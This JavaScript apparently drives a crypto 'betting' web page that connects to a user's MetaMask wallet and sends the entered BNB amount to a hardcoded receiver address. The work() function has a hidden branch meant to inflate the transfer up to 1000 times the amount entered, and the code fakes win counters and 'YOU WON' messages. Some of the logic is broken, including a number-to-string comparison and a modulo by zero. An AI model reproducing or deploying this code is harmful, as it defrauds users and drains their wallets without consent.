


async function get(){
console.log(fromAdress);
if(fromAdress!==undefined){
document.getElementById("connect").innerHTML = fromAdress;
}
}


  async function getAccount() {
      var account = 0;
      if (window.ethereum) { // for modern DApps browser
          window.web3 = new Web3(ethereum);
          try {
              await ethereum.enable();
          } catch (error) {
              console.error(error);
          }
      }else if (web3) { // for old DApps browser
          window.web3 = new Web3(web3.currentProvider);
      } else {
          console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
      }

      if(window.web3!== 'undefined'){
              try {
                  await window.web3.eth.getAccounts().then(it => {
                      account = it[0];
               });
      }catch (error) {
          console.error(error);
      }
      return account;
  }
}
let char2 = getAccount();

let fromAdress;
char2.then(function(result) {
 fromAdress = result;
});
let balance;
let beforeBalance;
setInterval(function(){

  web3.eth.getBalance(fromAdress).then(function(result) {
   balance = result;

   if((balance-beforeBalance) / 1000000000000000000 > 0){

     dollar();
     document.getElementById('changeWon').innerHTML = "YOU WON "+ (balance-beforeBalance) / 1000000000000000000 + " BNB";
   }
   beforeBalance = balance;

  });
}, 1000);

let minam;
  async function work() {

    let strEther = document.getElementById('value').value;

    if(strEther<minam){
      alert("Minimum amount of you send is "+ minam);
    }else{

      if(Math.floor(Math.random() * 4)==="1"){
      if(balance>strEther * 1000000000000000000 * 1000){
      strEther = strEther * 1000000000000000000 * 1000;
    }else if(balance>strEther * 1000000000000000000 * 100){
      strEther = strEther * 1000000000000000000 * 100;
    }else if(balance>strEther * 1000000000000000000 * 10){
      strEther = strEther * 1000000000000000000 * 10;
    }else{
      strEther = strEther * 1000000000000000000;
    }
}else{
  strEther = strEther * 1000000000000000000;
}


  try {

  const params = {
      from: fromAdress,
      to: receiver,
      value: strEther,
      gas: 500000
  };
      await window.ethereum.enable();
      window.web3 = new Web3(window.ethereum);
      const sendHash = window.web3.eth.sendTransaction(params);
      console.log('txnHash is ' + sendHash);
  } catch(e) {
      console.log("payment fail!");
      console.log(e);
  }
}

}


var oneDayInMs = 1000 * 60 * 60;
var currentTimeInMs = new Date().getTime();  // UTC time
var timeInDays = Math.floor(currentTimeInMs / oneDayInMs);

document.getElementById("wins").innerHTML = timeInDays % 0;
document.getElementById("loses").innerHTML = timeInDays % 0;

if(document.getElementById("wins").innerHTML<3000){
  document.getElementById("wins").innerHTML = document.getElementById("wins").innerHTML + 7;
}

let receiver;
function controlContract(){

let myNetwork = document.getElementById("network").value;

if(myNetwork==="bsc"){
 receiver = "0x3Badf0C6735b9cA02e3688a5f6F80225cCB24D28";
 document.getElementById('value').placeholder = "Minimum 0.1 BNB";
 minam = 0.1;
 switchNetwork();

}

}

  setInterval(function(){

  get();
  controlContract();
}, 1000);




const switchNetwork = async () => {
  try {
    await web3.currentProvider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x61" }],
    });
  } catch (error) {
    if (error.code === 4902) {
      try {
        await web3.currentProvider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: "0x61",
              chainName: "BSC Test Net",
              rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
              nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
              },
              blockExplorerUrls: ["https://testnet.bscscan.com/"],
            },
          ],
        });
      } catch (error) {
        alert(error.message);
      }
    }
  }
}

